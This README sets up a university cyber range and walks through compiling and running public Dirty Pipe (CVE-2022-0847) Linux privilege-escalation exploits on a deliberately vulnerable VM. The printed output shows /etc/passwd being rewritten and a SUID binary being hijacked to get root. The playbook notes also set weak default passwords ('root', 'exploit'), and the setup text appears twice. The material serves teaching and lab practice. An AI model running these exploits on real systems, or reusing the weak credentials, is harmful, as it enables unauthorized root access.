# Rutgers Scarlet Castle Cyber Range

## Setup

The Cyber Range has been updated to run on Ubuntu 20-4 with a mannually installed Kernel version 5.8. 
To get started, install the .ova file and open it up in your Virtual Machine appliaction of choice. I used VMware Workstation,
so see 'Step-1: Prepare Target System" directions for the setup on VMware Workstation. 

Once you're on the machine do the following:

1. Install Ansible:
```sudo apt-get install ansible```

2. Install unzip:
```sudo apt-get install unzip```

3. Use wget to download this repo
```wget https://github.com/kwxk/Rutgers_Cyber_Range/archive/refs/heads/main.zip```
4. ls
   Check if kwkx Rutgers_Cyber_Cyber_Range zip file is there.
5. ```unzip main.zip```
6.  ```ls```
 List the files. Change the directory to the directory of the cyber range files
7. cd into bare metal folder
8. ```chmod +x ./* ```
When you are in the directory of the cyber range files run the following command (chmod +x ./*) to make all files in the directory executable. This is necessary because we need to run these files later on. 


This Cyber Range/Hackbox was set up for a debian system. Run the ansible-playbook main_debian.yml

```
ansible-playbook main_debian.yml
```



---


# CVE-2022-0847-DirtyPipe-Exploits Scan

# Step-1: Prepare Target System:
⦁	Download “Exploit-Target-Ubuntu-20-4.ova”  
⦁	Open VMware workstation and go to “File>Open”:  
 
⦁	Browse and select “Exploit-Target-Ubuntu-20-4.ova” file: 
  
⦁	Set a name for VM and select the location to store it and click on Import:
 
⦁	Importing OVA:
 
⦁	Finally, the VM is ready to play and start it:
 
⦁	Now login with User: exploit password: exploit
 
⦁	Now the system is ready:
 
# Step-2: Install dependency and Check kernel version for vulnerability:
⦁	Start the VM and login with User: exploit Password: exploit
⦁	Open Terminal and check the kernel and OS version:
```
uname -r
5.11.0-27-generic

cat /etc/os-release 

NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
```
⦁	You will need to have GCC and Git installed:
```sudo apt-get install gcc git -y```
#  Step-3: Download and Compile CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully install git, gcc now clone the exploits scanner from GitHub:
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
⦁	Check is it download or not:
```
ls -la

drwxrwxr-x  3 exploit exploit 4096 Mar 23 01:49 CVE-2022-0847-DirtyPipe-Exploits
```
⦁	Change the directory:
``
cd CVE-2022-0847-DirtyPipe-Exploits
``
⦁	After installing GCC, you can run the 'compile.sh" script as follows:
```
chmod +x compile.sh
./compile.sh
```
# Step-4: Run CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully complied you’re able to run exploit-1:
```
./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

whoami
root
```
⦁	To exit from this console type exit and press enter twice:
exit
```
$
⦁	Run exploit-2:
./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

whoami
root

exit
```

## Affected versions
Linux kernel versions newer than 5.8 are affected.
So far the vulnerability has been patched in the following Linux kernel versions:
**5.16.11
5.15.25
5.10.102**
You can learn more about the vulnerability here: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847


# Rutgers Scarlet Castle Cyber Range

## Setup

The Cyber Range has been updated to run on Ubuntu 20-4 with a manually installed Kernel version 5.8.0

To get started, install the ***.ova** file* and open it up in your Virtual Machine application of choice. I used VMware Workstation so see 'Step-1: Prepare Target System" directions for the setup on VMware Workstation. 

The .OVA image of the cyber range has the exploit installed, however, it does not have Ansible installed nor does it have other users. 

**Once you're on the machine do the following:**

1. Install Ansible:
```sudo apt-get install ansible```

2. Install unzip:
```sudo apt-get install unzip```

3. Use wget to download this repo
```wget https://github.com/kwxk/Rutgers_Cyber_Range/archive/refs/heads/main.zip```
4. ```ls```
   Check if kwkx Rutgers_Cyber_Cyber_Range zip file is there.
5. ```unzip main.zip```
6.  ```ls```
 List the files. Change the directory to the directory of the cyber range files
7. cd into bare metal folder
8. ```chmod +x ./* ```
When you are in the directory of the cyber range files run the following command (chmod +x ./*) to make all files in the directory executable. This is necessary because we need to run these files later on. 


This Cyber Range/Hackbox was set up for a debian system. Run the ansible-playbook **main_debian.yml** 
```
ansible-playbook main_debian.yml
```
The regular main.yml is set up for Redhat/Fedora Systems. In theory, Fedora 28 and earlier versions of Fedora have affected Kernels. You could download a Fedora ISO from the Fedora ISO archive and then manually install Kernel 5.8.0 to the Kernel. Then, you can run the main.yml with the Redhat Ansible package names. 
https://archives.fedoraproject.org/pub/archive/fedora/linux/releases/23/Workstation/x86_64/iso/ 



---


# CVE-2022-0847-DirtyPipe-Exploits Scan

## Step-1: Prepare Target System:
⦁	Download “Exploit-Target-Ubuntu-20-4.ova”  
⦁	Open VMware workstation and go to “File>Open”:  
 
⦁	Browse and select “Exploit-Target-Ubuntu-20-4.ova” file: 
  
⦁	Set a name for VM and select the location to store it and click on Import:
 
⦁	Importing OVA:
 
⦁	Finally, the VM is ready to play and start it:
 
⦁	Now login with User: exploit password: exploit
 
⦁	Now the system is ready:
 
## Step-2: Install dependency and Check kernel version for vulnerability:
⦁	Start the VM and login with User: exploit Password: exploit
⦁	Open Terminal and check the kernel and OS version:
```
uname -r
5.11.0-27-generic

cat /etc/os-release 

NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
```
⦁	You will need to have GCC and Git installed:
```sudo apt-get install gcc git -y```
## Step-3: Download and Compile CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully install git, gcc now clone the exploits scanner from GitHub:
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
⦁	Check is it download or not:
```
ls -la

drwxrwxr-x  3 exploit exploit 4096 Mar 23 01:49 CVE-2022-0847-DirtyPipe-Exploits
```
⦁	Change the directory:
``
cd CVE-2022-0847-DirtyPipe-Exploits
``
⦁	After installing GCC, you can run the 'compile.sh" script as follows:
```
chmod +x compile.sh
./compile.sh
```
## Step-4: Run CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully complied you’re able to run exploit-1:
```
./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

whoami
root
```
⦁	To exit from this console type exit and press enter twice:
exit
```
$
⦁	Run exploit-2:
./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

whoami
root

exit
```

### Affected versions
Linux kernel versions newer than 5.8 are affected.
So far the vulnerability has been patched in the following Linux kernel versions:
**5.16.11
5.15.25
5.10.102**
You can learn more about the vulnerability here: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847


---

# Playbook Breakdown

## main_debian.yml

# main_debian.yml

This Ansible playbook sets up a specific configuration for a Debian-based system, presumably in a Rutgers Cyber Range environment.

## Tasks

1. **Update APT cache**
Update the APT (Advanced Package Tool) cache with a ```cache_valid_time``` of 3600 seconds (1 hour). This means that the cache will be considered up-to-date for 1 hour after updating, reducing the need for frequent updates when installing packages in a short period.

2. **Install dependencies**
   Install the following packages: wget, make, and gcc.
-   `wget`: A utility to download files from the web using HTTP, HTTPS, and FTP protocols.
-   `make`: A build automation tool that simplifies the process of compiling and linking programs.
-   `gcc`: The GNU Compiler Collection, which includes compilers for several programming languages, including C, C++, Objective-C, Fortran, Ada, D, and others.

3.  **Install apache2 and PHP packages**
    -   `apache2`: A widely used web server software that serves HTTP requests.
    -   `PHP`: A popular server-side scripting language designed for web
---
## IPtables and opening ports

`IPtables` is a user-space utility program that allows a system administrator to configure the IP packet filter rules of the Linux kernel firewall, implemented as different Netfilter modules. It provides an interface to manage the packet filtering rules for incoming and outgoing traffic on a Linux system. IPtables can be used to control network traffic, improve security, and perform network address translation (NAT).

In this playbook, IPtables is being used to open ports 80 and 443:

-   **Port 80**: This is the default port for serving HTTP (unsecured) web traffic. By opening this port, the playbook ensures that the Apache2 web server can accept incoming HTTP requests from clients.
    
-   **Port 443**: This is the default port for serving HTTPS (secured) web traffic. By opening this port, the playbook allows the Apache2 web server to accept incoming HTTPS requests from clients, providing a secure and encrypted connection between the server and clients.
    

Opening these ports is important for the proper functioning of a web server, as it ensures that clients can connect to the server to access web content and services.

4. **Open port 80 for apache2**
   Configure the iptables firewall to open port 80 for incoming HTTP traffic.

5. **Open port 443 for https traffic**
   Configure the iptables firewall to open port 443 for incoming HTTPS traffic.
---
6. **Start apache2 services**
   Ensure the Apache2 service is started.

7. **Create group**
   Create a new group named "usersgroup".

8. **Create users**
   Create new users with the names listed in the `users.txt` file. Each user will have a home directory under `/srv/`, belong to the "usersgroup" group, and have an SSH key generated.

9. **Set password to users**
   Set the password for each user to "root". This step will not log any information.

10. **Create restricted file**
    Create a new file named `restricted.txt` in the `/var/www/` directory with the

